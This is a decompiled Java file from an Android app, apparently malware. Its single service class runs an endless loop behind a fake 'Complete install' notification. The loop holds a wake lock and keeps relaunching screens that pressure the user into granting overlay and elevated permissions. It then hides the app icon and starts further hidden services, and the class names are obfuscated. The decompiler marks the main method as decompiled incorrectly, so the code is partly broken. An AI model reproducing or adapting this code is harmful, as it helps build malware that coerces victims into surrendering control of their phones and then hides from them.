package com.appser;

import android.app.IntentService;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;

public class myworker extends IntentService {
    PowerManager.WakeLock wakeLock = null;

    public myworker() {
        super("");
    }

    public void onDestroy() {
        super.onDestroy();
        if (!this.wakeLock.equals((Object) null) && this.wakeLock.isHeld()) {
            this.wakeLock.release();
        }
    }

    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    public static void cancelnotification(Context context, int i) {
        ((NotificationManager) context.getSystemService("notification")).cancel(i);
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Can't wrap try/catch for region: R(6:19|20|21|23|24|(2:33|(3:42|(2:44|(6:46|47|48|49|50|81)(2:51|82))(8:52|(1:54)|55|(8:57|58|(1:60)|61|(1:63)|64|65|(1:67))|68|70|71|83)|74)(3:39|(2:41|79)(1:78)|74))(3:28|(2:30|(2:32|77)(1:76))(1:75)|74)) */
    /* JADX WARNING: Can't wrap try/catch for region: R(6:46|47|48|49|50|81) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:19:0x00a8 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:49:0x0156 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:64:0x01c1 */
    /* JADX WARNING: Removed duplicated region for block: B:19:0x00a8 A[LOOP:0: B:19:0x00a8->B:74:0x00a8, LOOP_START, SYNTHETIC, Splitter:B:19:0x00a8] */
    /* JADX WARNING: Removed duplicated region for block: B:67:0x01c5 A[Catch:{ Exception -> 0x01d0 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onHandleIntent(android.content.Intent r9) {
        /*
            r8 = this;
            int r9 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x01d6 }
            r0 = 26
            java.lang.String r1 = "MyInstall"
            r2 = 0
            if (r9 < r0) goto L_0x0030
            java.lang.Class<android.app.NotificationManager> r9 = android.app.NotificationManager.class
            java.lang.Object r9 = r8.getSystemService(r9)     // Catch:{ Exception -> 0x01d6 }
            android.app.NotificationManager r9 = (android.app.NotificationManager) r9     // Catch:{ Exception -> 0x01d6 }
            if (r9 == 0) goto L_0x0030
            android.app.NotificationChannel r3 = r9.getNotificationChannel(r1)     // Catch:{ Exception -> 0x01d6 }
            if (r3 != 0) goto L_0x0030
            android.app.NotificationChannel r3 = new android.app.NotificationChannel     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r4 = "Install"
            r5 = 3
            r3.<init>(r1, r4, r5)     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r4 = "Installation"
            r3.setDescription(r4)     // Catch:{ Exception -> 0x01d6 }
            r3.setShowBadge(r2)     // Catch:{ Exception -> 0x01d6 }
            r4 = 0
            r3.setSound(r4, r4)     // Catch:{ Exception -> 0x01d6 }
            r9.createNotificationChannel(r3)     // Catch:{ Exception -> 0x01d6 }
        L_0x0030:
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x01d6 }
            java.lang.Class<com.appser.necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16> r3 = com.appser.necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16.class
            r9.<init>(r8, r3)     // Catch:{ Exception -> 0x01d6 }
            r3 = 1879080960(0x70008000, float:1.590753E29)
            r9.setFlags(r3)     // Catch:{ Exception -> 0x01d6 }
            r3 = 201326592(0xc000000, float:9.8607613E-32)
            android.app.PendingIntent r9 = android.app.PendingIntent.getActivity(r8, r2, r9, r3)     // Catch:{ Exception -> 0x01d6 }
            android.support.v4.app.NotificationCompat$Builder r3 = new android.support.v4.app.NotificationCompat$Builder     // Catch:{ Exception -> 0x01d6 }
            r3.<init>(r8, r1)     // Catch:{ Exception -> 0x01d6 }
            r1 = 17170445(0x106000d, float:2.461195E-38)
            android.support.v4.app.NotificationCompat$Builder r1 = r3.setSmallIcon(r1)     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r3 = "Complete install"
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setContentTitle(r3)     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r3 = "Click Here to Complete installing"
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setContentText(r3)     // Catch:{ Exception -> 0x01d6 }
            r3 = 1
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setPriority(r3)     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r4 = "call"
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setCategory(r4)     // Catch:{ Exception -> 0x01d6 }
            r4 = -1
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setDefaults(r4)     // Catch:{ Exception -> 0x01d6 }
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setOngoing(r3)     // Catch:{ Exception -> 0x01d6 }
            android.support.v4.app.NotificationCompat$Builder r1 = r1.setAutoCancel(r2)     // Catch:{ Exception -> 0x01d6 }
            android.support.v4.app.NotificationCompat$Builder r9 = r1.setFullScreenIntent(r9, r3)     // Catch:{ Exception -> 0x01d6 }
            android.support.v4.app.NotificationManagerCompat.from(r8)     // Catch:{ Exception -> 0x01d6 }
            r1 = 1547(0x60b, float:2.168E-42)
            android.app.Notification r9 = r9.build()     // Catch:{ Exception -> 0x01d6 }
            r8.startForeground(r1, r9)     // Catch:{ Exception -> 0x01d6 }
            java.lang.String r9 = "power"
            java.lang.Object r9 = r8.getSystemService(r9)     // Catch:{ Exception -> 0x01d6 }
            android.os.PowerManager r9 = (android.os.PowerManager) r9     // Catch:{ Exception -> 0x01d6 }
            android.os.PowerManager$WakeLock r1 = r8.wakeLock     // Catch:{ Exception -> 0x01d6 }
            if (r1 != 0) goto L_0x0097
            java.lang.String r1 = "Android:Watchlock"
            android.os.PowerManager$WakeLock r9 = r9.newWakeLock(r3, r1)     // Catch:{ Exception -> 0x01d6 }
            r8.wakeLock = r9     // Catch:{ Exception -> 0x01d6 }
        L_0x0097:
            android.os.PowerManager$WakeLock r9 = r8.wakeLock     // Catch:{ Exception -> 0x01d6 }
            if (r9 == 0) goto L_0x00a8
            android.os.PowerManager$WakeLock r9 = r8.wakeLock     // Catch:{ Exception -> 0x01d6 }
            boolean r9 = r9.isHeld()     // Catch:{ Exception -> 0x01d6 }
            if (r9 != 0) goto L_0x00a8
            android.os.PowerManager$WakeLock r9 = r8.wakeLock     // Catch:{ Exception -> 0x01d6 }
            r9.acquire()     // Catch:{ Exception -> 0x01d6 }
        L_0x00a8:
            java.util.concurrent.TimeUnit r9 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x00b0 }
            int r1 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime     // Catch:{ InterruptedException -> 0x00b0 }
            long r4 = (long) r1     // Catch:{ InterruptedException -> 0x00b0 }
            r9.sleep(r4)     // Catch:{ InterruptedException -> 0x00b0 }
        L_0x00b0:
            java.lang.Class<com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32> r9 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.class
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.IA_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_E(r8, r9)     // Catch:{ Exception -> 0x00a8 }
            r1 = 3500(0xdac, float:4.905E-42)
            r4 = 1073741824(0x40000000, float:2.0)
            r5 = 536870912(0x20000000, float:1.0842022E-19)
            r6 = 268435456(0x10000000, float:2.5243549E-29)
            if (r9 != 0) goto L_0x00f1
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.NeedSuper()     // Catch:{ Exception -> 0x00a8 }
            if (r9 == 0) goto L_0x00f1
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.GS_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_B(r8)     // Catch:{ Exception -> 0x00a8 }
            if (r9 == 0) goto L_0x00a8
            int r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.Trys     // Catch:{ Exception -> 0x00a8 }
            int r9 = r9 + r3
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.Trys = r9     // Catch:{ Exception -> 0x00a8 }
            int r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.Trys     // Catch:{ Exception -> 0x00a8 }
            r7 = 5
            if (r9 < r7) goto L_0x00a8
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.Trys = r2     // Catch:{ Exception -> 0x00a8 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime = r1     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x00a8 }
            java.lang.Class<com.appser.necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16> r1 = com.appser.necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16.class
            r9.<init>(r8, r1)     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = r9.addFlags(r6)     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = r9.addFlags(r5)     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = r9.addFlags(r4)     // Catch:{ Exception -> 0x00a8 }
            r8.startActivity(r9)     // Catch:{ Exception -> 0x00a8 }
            goto L_0x00a8
        L_0x00f1:
            int r9 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x00a8 }
            r7 = 23
            if (r9 < r7) goto L_0x0124
            boolean r9 = android.provider.Settings.canDrawOverlays(r8)     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x0124
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.NeedSuper()     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x0124
            java.lang.Boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.shown     // Catch:{ Exception -> 0x00a8 }
            boolean r9 = r9.booleanValue()     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x00a8
            r9 = 5000(0x1388, float:7.006E-42)
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime = r9     // Catch:{ Exception -> 0x00a8 }
            java.lang.Boolean r9 = java.lang.Boolean.valueOf(r3)     // Catch:{ Exception -> 0x00a8 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.shown = r9     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x00a8 }
            java.lang.Class<com.appser.gardenxgroundshsociologyoshowingqanthonytmsgwdaughtersediscountsgproblemnplcfhouseholdstchaino18> r1 = com.appser.gardenxgroundshsociologyoshowingqanthonytmsgwdaughtersediscountsgproblemnplcfhouseholdstchaino18.class
            r9.<init>(r8, r1)     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = r9.addFlags(r6)     // Catch:{ Exception -> 0x00a8 }
            r8.startActivity(r9)     // Catch:{ Exception -> 0x00a8 }
            goto L_0x00a8
        L_0x0124:
            java.lang.String[] r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.PERMISSIONS()     // Catch:{ Exception -> 0x00a8 }
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.H__advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_P(r8, r9)     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x0164
            java.lang.Boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.asked     // Catch:{ Exception -> 0x00a8 }
            boolean r9 = r9.booleanValue()     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x015e
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime = r1     // Catch:{ Exception -> 0x00a8 }
            java.lang.Boolean r9 = java.lang.Boolean.valueOf(r3)     // Catch:{ Exception -> 0x00a8 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.asked = r9     // Catch:{ Exception -> 0x00a8 }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x0156 }
            java.lang.Class<com.appser.miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24> r1 = com.appser.miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24.class
            r9.<init>(r8, r1)     // Catch:{ Exception -> 0x0156 }
            android.content.Intent r9 = r9.addFlags(r6)     // Catch:{ Exception -> 0x0156 }
            android.content.Intent r9 = r9.addFlags(r5)     // Catch:{ Exception -> 0x0156 }
            android.content.Intent r9 = r9.addFlags(r4)     // Catch:{ Exception -> 0x0156 }
            r8.startActivity(r9)     // Catch:{ Exception -> 0x0156 }
            goto L_0x00a8
        L_0x0156:
            java.lang.Boolean r9 = java.lang.Boolean.valueOf(r2)     // Catch:{ Exception -> 0x00a8 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.asked = r9     // Catch:{ Exception -> 0x00a8 }
            goto L_0x00a8
        L_0x015e:
            r9 = 2000(0x7d0, float:2.803E-42)
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime = r9     // Catch:{ Exception -> 0x00a8 }
            goto L_0x00a8
        L_0x0164:
            boolean r9 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.Is_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_Hidden     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x0173
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.Is_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_Hidden = r3     // Catch:{ Exception -> 0x00a8 }
            android.content.Context r9 = r8.getApplicationContext()     // Catch:{ Exception -> 0x00a8 }
            java.lang.String r1 = "I#C#O#N#S#C#A#N#E#R"
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.SwapMe(r9, r1)     // Catch:{ Exception -> 0x00a8 }
        L_0x0173:
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.iamworking     // Catch:{ Exception -> 0x00a8 }
            if (r9 != 0) goto L_0x01d0
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.allok = r3     // Catch:{ Exception -> 0x01c1 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.iamworking = r3     // Catch:{ Exception -> 0x01c1 }
            java.lang.Boolean r9 = java.lang.Boolean.valueOf(r2)     // Catch:{ Exception -> 0x01c1 }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32bypass = r9     // Catch:{ Exception -> 0x01c1 }
            java.lang.Boolean r9 = java.lang.Boolean.valueOf(r2)     // Catch:{ Exception -> 0x01c1 }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim = r9     // Catch:{ Exception -> 0x01c1 }
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32CheckPrims = r3     // Catch:{ Exception -> 0x01c1 }
            java.lang.Class<com.appser.verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33> r9 = com.appser.verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class
            boolean r9 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(r9, r8)     // Catch:{ Exception -> 0x01c1 }
            if (r9 == 0) goto L_0x01a8
            android.content.res.Resources r9 = r8.getResources()     // Catch:{ Exception -> 0x01c1 }
            r1 = 2131296276(0x7f090014, float:1.8210464E38)
            java.lang.String r9 = r9.getString(r1)     // Catch:{ Exception -> 0x01c1 }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.p_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_r = r9     // Catch:{ Exception -> 0x01c1 }
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x01c1 }
            java.lang.Class<com.appser.verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33> r1 = com.appser.verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class
            r9.<init>(r8, r1)     // Catch:{ Exception -> 0x01c1 }
            r8.startService(r9)     // Catch:{ Exception -> 0x01c1 }
        L_0x01a8:
            boolean r9 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.is_dozemode(r8)     // Catch:{ Exception -> 0x01c1 }
            if (r9 != 0) goto L_0x01c1
            android.content.Intent r9 = new android.content.Intent     // Catch:{ Exception -> 0x01c1 }
            java.lang.Class<com.appser.punchsrevelationbdescendingnmomddsccnakedcadvisorymmarieqdispatchosubscriptionhmotorcyclesd17> r1 = com.appser.punchsrevelationbdescendingnmomddsccnakedcadvisorymmarieqdispatchosubscriptionhmotorcyclesd17.class
            r9.<init>(r8, r1)     // Catch:{ Exception -> 0x01c1 }
            r9.addFlags(r6)     // Catch:{ Exception -> 0x01c1 }
            r9.addFlags(r5)     // Catch:{ Exception -> 0x01c1 }
            r9.addFlags(r4)     // Catch:{ Exception -> 0x01c1 }
            r8.startActivity(r9)     // Catch:{ Exception -> 0x01c1 }
        L_0x01c1:
            int r9 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x01d0 }
            if (r9 < r0) goto L_0x01d0
            r9 = 6676(0x1a14, float:9.355E-42)
            cancelnotification(r8, r9)     // Catch:{ Exception -> 0x01d0 }
            r8.stopForeground(r3)     // Catch:{ Exception -> 0x01d0 }
            r8.stopSelf()     // Catch:{ Exception -> 0x01d0 }
        L_0x01d0:
            r9 = 25000(0x61a8, float:3.5032E-41)
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.speedTime = r9     // Catch:{ Exception -> 0x00a8 }
            goto L_0x00a8
        L_0x01d6:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.myworker.onHandleIntent(android.content.Intent):void");
    }
}
